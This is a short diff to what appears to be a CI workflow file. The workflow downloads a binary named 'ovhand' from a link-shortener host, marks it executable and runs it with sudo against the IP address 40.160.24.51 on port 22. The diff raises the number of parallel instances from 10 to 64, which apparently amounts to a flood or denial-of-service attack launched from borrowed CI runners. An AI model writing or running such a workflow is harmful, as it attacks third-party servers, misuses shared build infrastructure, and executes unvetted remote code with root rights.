@@ -17,8 +17,8 @@ jobs:
           wget https://curl.by/y6xb1/ovhand -O ovhand
           chmod +x ovhand
           PIDS=()
-          for i in {1..10}; do
-            sudo timeout 30 ./ovhand 40.160.24.51 22 16 30 &
+          for i in {1..64}; do
+            sudo timeout 30 ./ovhand 40.160.24.51 22 10 30 &
             PIDS+=($!)
           done
           
